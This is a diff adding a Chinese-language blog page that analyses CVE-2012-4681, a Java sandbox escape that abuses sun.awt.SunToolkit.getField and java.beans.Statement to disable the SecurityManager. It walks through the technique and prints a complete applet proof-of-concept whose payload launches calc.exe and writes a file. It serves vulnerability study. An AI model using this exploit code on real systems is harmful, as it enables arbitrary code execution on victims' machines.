@@ -1,0 +1,197 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>Java Exploit分析之CVE-2012-4681 | 骆驼的乌托邦</title>
+  <meta name="author" content="liteway">
+  
+  <meta name="description" content="CVE-2012-4681一个是Java API层的漏洞，通过利用sun.awt.SunToolkit类中的getField方法来间接绕过SecurityManager的限制，从而绕过JRE Sandbox。该漏洞影响范围是JRE7U6以前的版本。">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Java Exploit分析之CVE-2012-4681"/>
+  <meta property="og:site_name" content="骆驼的乌托邦"/>
+
+  
+    <meta property="og:image" content="undefined"/>
+  
+
+  <link href="/favicon.ico" rel="icon" type="image/x-ico">
+  <link rel="alternate" href="/atom.xml" title="骆驼的乌托邦" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  
+</head>
+
+
+<body>
+  <header id="header" class="inner"><div class="alignleft">
+  <h1><a href="/">骆驼的乌托邦</a></h1>
+  <h2 class="subtitle"></h2>
+</div>
+<nav id="main-nav" class="alignright">
+  <ul>
+    
+      <li><a href="/">Home</a></li>
+    
+      <li><a href="/archives">Archives</a></li>
+    
+      <li><a href="/about">About</a></li>
+    
+      <li><a href="/atom.xml">RSS</a></li>
+    
+  </ul>
+  <div class="clearfix"></div>
+</nav>
+<div class="clearfix"></div>
+</header>
+  <div id="content" class="inner">
+    <div id="main-col" class="alignleft"><div id="wrapper"><article class="post">
+  
+    <div class="gallery">
+  <div class="photoset">
+    
+      <img src="">
+    
+  </div>
+  <div class="control">
+    <div class="prev"></div>
+    <div class="next"></div>
+  </div>
+</div>
+  
+  <div class="post-content">
+    <header>
+      
+        <div class="icon"></div>
+        <time datetime="2014-09-14T15:26:26.000Z"><a href="/2014/09/14/java_cve_2012_4681/">2014-09-14</a></time>
+      
+      
+  
+    <h1 class="title">Java Exploit分析之CVE-2012-4681</h1>
+  
+
+    </header>
+    <div class="entry">
+      
+        <p>CVE-2012-4681一个是Java API层的漏洞，通过利用sun.awt.SunToolkit类中的getField方法来间接绕过SecurityManager的限制，从而绕过JRE Sandbox。该漏洞影响范围是JRE7U6以前的版本。<a id="more"></a></p>
+<h2 id="缺陷API">缺陷API</h2><p>该漏洞的缺陷API位于sun.awt.SunToolkit类中的getField方法，该方法在doPrivileged块中调用反射API-getDeclaredField()方法，并通过setAccessible将field（无论公有或私有）设置为可访问的，以此可以绕过栈检查，并得到修改访问权限后的field对象。该缺陷方法伪代码如下：<br><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function">Field <span class="title">getField</span><span class="params">(class_obj, field_str)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">return</span> AccessController.<span class="title">doPrivileged</span><span class="params">(</span><br><span class="line">    <span class="keyword">new</span> PrivilegedAction()</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="function">Field <span class="title">run</span><span class="params">()</span></span>&#123;</span><br><span class="line">        Field f = class_obj.getDeclaredField(field_str);</span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">return</span> f;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>通过利用getField方法，我们可以获取java.beans.Statement的私有域acc(AccessControlContext对象)，从而可以利用反射设置该acc域的值为自定义权限。</p>
+<h2 id="详细利用分析">详细利用分析</h2><h3 id="1-_访问sun-awt-SunToolkit类">1. 访问sun.awt.SunToolkit类</h3><p>由于sun包在JRE的限制访问包列表中，不能直接访问sun中的类，这里借助java.beans.Expression类间接调用Class.forName来访问SunToolkit类。<br>Expression类的构造函数可以用来调用类的静态方法，其构造函数的3个参数以此为：类、静态方法名、方法参数，访问代码如下：<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Expression <span class="built_in">exp</span> = new Expression<span class="params">(Class.class, <span class="string">"forName"</span>, new Object[]&#123;<span class="string">"sun.awt.SunToolkit"</span>&#125;)</span>;</span><br><span class="line"><span class="built_in">exp</span>.execute<span class="params">()</span>;</span><br><span class="line"><span class="comment">//stk_cls即为SunToolkit类</span></span><br><span class="line">Class stk_cls = <span class="params">(Class)</span><span class="built_in">exp</span>.getValue<span class="params">()</span>;</span><br></pre></td></tr></table></figure></p>
+<h3 id="2-_调用getField方法">2. 调用getField方法</h3><p>既然Expression这么强大，而且SunToolKit类中的getField方法也是静态方法，我们依然可以构造Expression来访问该方法。利用该方法我们来获取某个类的Field对象后，就可以设置其对应实例的Field值为任意值：<br><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Expression ex<span class="variable">p2</span> =<span class="instruction"> new </span>Expression(stk_cls, <span class="string">"getField"</span>,<span class="instruction"> new </span>Object<span class="keyword">[</span>]&#123;class_obj, field_str&#125;<span class="function">)</span>;</span><br><span class="line">ex<span class="variable">p2</span>.execute(<span class="function">)</span>;</span><br><span class="line">//set<span class="instruction"> instance </span>object's field = field_value</span><br><span class="line">((Field<span class="function">)</span>ex<span class="variable">p2</span>.getValue(<span class="function">)</span><span class="function">)</span>.set(instance_obj, field_value<span class="function">)</span>;</span><br></pre></td></tr></table></figure></p>
+<h3 id="3-_Disable_SecurityManager">3. Disable SecurityManager</h3><p>我们的目标是能够在当前Context中设置SecurityManager为null，然后我们的shellcode就可以在JRE上大行其道，直接设置肯定是不允许的，所以我们首先要构造一个可以执行这个操作的Context。<br>通过源码可以发现Expression的父类java.beans.Statement存在着这样一个Context(AccessControlContext对象acc)，利用前面介绍的getField方法就可以设置当前的acc域的值为任意值，这个任意值我们设置为具有AllPermission权限的Context，再在这个Context上去disable SecurityManager，这里依然使用Statement表达式间接调用setSecurityManager方法。代码如下：<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Statement st = <span class="keyword">new</span> Statement(System.<span class="keyword">class</span>, <span class="string">"setSecurityManager"</span>, <span class="keyword">new</span> <span class="built_in">Object</span>[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">final</span> Permissions ps = <span class="keyword">new</span> Permissions();</span><br><span class="line">ps.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line">ProtectionDomain pd = <span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(<span class="keyword">new</span> URL(<span class="string">"file:////"</span>), <span class="keyword">new</span> Certificate[<span class="number">0</span>]), ps);</span><br><span class="line">AccessControlContext new_acc = <span class="keyword">new</span> AccessControlContext(<span class="keyword">new</span> ProtectionDomain[]&#123;pd&#125;);</span><br><span class="line"><span class="comment">//call Field Object from getField to set acc</span></span><br><span class="line">((Field)exp2.getValue()).<span class="literal">set</span>(st, new_acc);</span><br><span class="line">st.execute();</span><br></pre></td></tr></table></figure></p>
+<h3 id="4-_POC参考代码">4. POC参考代码</h3><p>CVE-2012-4681的Exploit代码如下（参考Metasploit）：<br><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.applet.Applet;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.beans.Expression;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.beans.Statement;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.io.FileWriter;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.lang.reflect.Field;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.net.URL;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.AccessControlContext;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.AllPermission;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.CodeSource;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.Permissions;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.ProtectionDomain;</span></span><br><span class="line"><span class="preprocessor"><span class="keyword">import</span> java.security.cert.Certificate;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//CVE-2012-4681 POC</span></span><br><span class="line"><span class="comment">//use reflection API to set current Statement.acc=allpermission, and disable securitymanager</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> <span class="keyword">extends</span> <span class="title">Applet</span> </span>&#123;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> init()&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">//disable securitymanager</span></span><br><span class="line">      <span class="keyword">this</span>.disableSecurity();</span><br><span class="line">      <span class="comment">//set payload and execute arbitrary code</span></span><br><span class="line">      <span class="keyword">this</span>.setPayload();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>(Throwable t)&#123;</span><br><span class="line">      t.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//get class object with reflection</span></span><br><span class="line">  <span class="keyword">private</span> Class getClass(<span class="keyword">final</span> String s) throws Throwable &#123;</span><br><span class="line">    <span class="keyword">final</span> Expression express = <span class="keyword">new</span> Expression(Class.<span class="keyword">class</span>, <span class="string">"forName"</span>, <span class="keyword">new</span> Object[]&#123;s&#125;);</span><br><span class="line">    express.execute();</span><br><span class="line">    <span class="keyword">return</span> (Class)express.getValue();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">//call sun's getField func(can get any field of any class), set object o's field s=o1</span></span><br><span class="line">  <span class="comment">//sun package is not allowed to access directly, use getClass reflect method to access</span></span><br><span class="line">  <span class="keyword">private</span> <span class="keyword">void</span> setField(<span class="keyword">final</span> Class cls, <span class="keyword">final</span> String s, <span class="keyword">final</span> Object o, <span class="keyword">final</span> Object o1) throws Throwable &#123;</span><br><span class="line">    <span class="keyword">final</span> Expression express = <span class="keyword">new</span> Expression(<span class="keyword">this</span>.getClass(<span class="string">"sun.awt.SunToolkit"</span>), <span class="string">"getField"</span>, <span class="keyword">new</span> Object[]&#123;cls, s&#125;);</span><br><span class="line">    express.execute();</span><br><span class="line">    ((Field)express.getValue()).<span class="keyword">set</span>(o, o1);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> disableSecurity() throws Throwable &#123;</span><br><span class="line">    <span class="comment">//initial argument is null</span></span><br><span class="line">    <span class="keyword">final</span> Statement st = <span class="keyword">new</span> Statement(System.<span class="keyword">class</span>, <span class="string">"setSecurityManager"</span>, <span class="keyword">new</span> Object[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">final</span> Permissions ps = <span class="keyword">new</span> Permissions();</span><br><span class="line">    ps.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line">    ProtectionDomain pd = <span class="keyword">new</span> ProtectionDomain(<span class="keyword">new</span> CodeSource(<span class="keyword">new</span> URL(<span class="string">"file:////"</span>), <span class="keyword">new</span> Certificate[<span class="number">0</span>]), ps);</span><br><span class="line">    AccessControlContext new_acc = <span class="keyword">new</span> AccessControlContext(<span class="keyword">new</span> ProtectionDomain[]&#123;pd&#125;);</span><br><span class="line">    <span class="comment">//set st's AccessControlContext property=user_defined all permission value</span></span><br><span class="line">    <span class="keyword">this</span>.setField(Statement.<span class="keyword">class</span>, <span class="string">"acc"</span>, st, new_acc);</span><br><span class="line">    <span class="comment">//call st's method to set securitymanger=null</span></span><br><span class="line">    st.execute();</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> setPayload() throws Throwable &#123;</span><br><span class="line">    Runtime.getRuntime().exec(<span class="string">"calc.exe"</span>);</span><br><span class="line">    FileWriter fw = <span class="keyword">new</span> FileWriter(<span class="string">"c:\\hack.txt"</span>);</span><br><span class="line">    fw.write(<span class="string">"hello, hacking success"</span>);</span><br><span class="line">    fw.close();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+    <footer>
+      
+        
+  
+  <div class="categories">
+    <a href="/categories/漏洞分析/">漏洞分析</a>
+  </div>
+
+        
+  
+  <div class="tags">
+    <a href="/tags/Java-CVE/">Java CVE</a>
+  </div>
+
+        
+      
+      <div class="clearfix"></div>
+    </footer>
+  </div>
+</article>
+
+
+</div></div>
+    <aside id="sidebar" class="alignright">
+  <div class="search">
+  <form action="//google.com/search" method="get" accept-charset="utf-8">
+    <input type="search" name="q" results="0" placeholder="搜索">
+    <input type="hidden" name="q" value="site:github.com/liteway/liteway.github.io">
+  </form>
+</div>
+
+  
+<div class="widget tag">
+  <h3 class="title">分类</h3>
+  <ul class="entry">
+  
+    <li><a href="/categories/Python/">Python</a><small>1</small></li>
+  
+    <li><a href="/categories/渗透测试/">渗透测试</a><small>1</small></li>
+  
+    <li><a href="/categories/漏洞分析/">漏洞分析</a><small>4</small></li>
+  
+  </ul>
+</div>
+
+
+  
+<div class="widget tag">
+  <h3 class="title">最新文章</h3>
+  <ul class="entry">
+    
+      <li>
+        <a href="/2015/06/20/py_httpclient/">Python HTTP Client Lib</a>
+      </li>
+    
+      <li>
+        <a href="/2015/04/20/ie_cve_2012_4969/">IE UAF漏洞分析之CVE-2012-4969</a>
+      </li>
+    
+      <li>
+        <a href="/2014/11/30/java_exploit_type_confusion/">Watching Type Confusion Attacks from Java Exploits</a>
+      </li>
+    
+      <li>
+        <a href="/2014/09/18/java_cve_2012_5076/">Java Exploit分析之CVE-2012-5076</a>
+      </li>
+    
+      <li>
+        <a href="/2014/09/14/java_cve_2012_4681/">Java Exploit分析之CVE-2012-4681</a>
+      </li>
+    
+  </ul>
+</div>
+
+
+  
+<div class="widget tagcloud">
+  <h3 class="title">标签云</h3>
+  <div class="entry">
+    <a href="/tags/IE-CVE/" style="font-size: 10px;">IE CVE</a> <a href="/tags/Java-CVE/" style="font-size: 20px;">Java CVE</a> <a href="/tags/Metasploit/" style="font-size: 10px;">Metasploit</a> <a href="/tags/UAF/" style="font-size: 10px;">UAF</a> <a href="/tags/python/" style="font-size: 10px;">python</a>
+  </div>
+</div>
+
+</aside>
+    <div class="clearfix"></div>
+  </div>
+  <footer id="footer" class="inner"><div class="alignleft">
+  
+  &copy; 2015 liteway
+  
+</div>
+<div class="clearfix"></div></footer>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+</body>
+</html>
